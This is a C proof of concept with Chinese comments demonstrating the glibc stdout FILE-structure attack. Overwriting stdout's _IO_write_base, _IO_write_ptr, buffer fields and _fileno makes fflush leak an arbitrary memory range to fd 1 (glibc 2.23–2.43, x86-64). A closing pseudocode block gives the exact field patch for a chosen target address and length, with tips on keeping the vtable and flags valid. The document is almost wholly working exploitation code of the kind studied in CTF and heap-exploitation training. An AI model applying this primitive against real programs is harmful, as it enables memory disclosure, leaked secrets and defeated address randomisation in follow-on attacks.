/*
 * 覆盖 stdout 字段来获得任意地址读，适用于 glibc 2.23～2.43 / x86-64。
 *
 * 前置能力：能够覆盖 libc 中的 stdout 对象。
 * 效果：fflush 会把 secret 指向的那段进程内存直接写到 fd 1。
 */

#include <assert.h>
#include <stdio.h>
#include <unistd.h>

int main(void)
{
    static char secret[] = "[+] stdout 任意读成功\n";

    /* 先清空 stdout 原来的待输出数据。 */
    assert(fflush(stdout) == 0);

    /* write_base 和 write_ptr 直接描述希望泄漏的内存区间。 */
    stdout->_IO_write_base = secret;
    stdout->_IO_write_ptr = secret + sizeof(secret) - 1;
    stdout->_IO_write_end = secret + sizeof(secret) - 1;

    /* read_end 等于 write_base，避免输出前尝试对 pipe 或终端执行 lseek。 */
    stdout->_IO_read_end = secret;

    /* 保持内部缓冲区边界与待输出区间一致。 */
    stdout->_IO_buf_base = secret;
    stdout->_IO_buf_end = secret + sizeof(secret) - 1;
    stdout->_fileno = STDOUT_FILENO;

    /* fflush 最终执行 write(1, secret, sizeof(secret)-1)。 */
    assert(fflush(stdout) == 0);

    /* stdout 已被破坏，直接退出，屏幕上的 secret 就是成功判据。 */
    _exit(0);
}

/*
 * ======================== 字段补丁伪代码 ========================
 *
 * 不再生成独立二进制 payload。已有 stdout 地址和待泄漏区间时，只覆盖：
 *
 *     stdout._IO_read_ptr = target；
 *     stdout._IO_read_end = target；
 *     stdout._IO_read_base = target；
 *     stdout._IO_write_base = target；
 *     stdout._IO_write_ptr = target + length；
 *     stdout._IO_write_end = target + length；
 *     stdout._IO_buf_base = target；
 *     stdout._IO_buf_end = target + length；
 *     stdout._fileno = 1；
 *
 * 保留原对象合法 vtable，并按原 flags 只修改必要字段。最后触发 fflush 或
 * 对应 file write 消费点；不要把固定 stdout 地址写进通用 payload。
 */
